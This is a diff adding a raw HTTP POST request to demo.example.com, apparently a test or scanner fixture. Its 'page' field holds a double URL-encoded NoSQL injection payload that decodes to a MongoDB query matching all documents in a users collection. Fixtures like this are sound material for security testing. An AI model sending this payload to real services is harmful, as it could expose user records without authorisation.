@@ -1,0 +1,7 @@
+POST /submit HTTP/1.1
+Host: demo.example.com
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 78
+Connection: close
+
+page=db.users.aggregate%2528%255B%257B%2524match%253A%257B%257D%257D%255D%2529
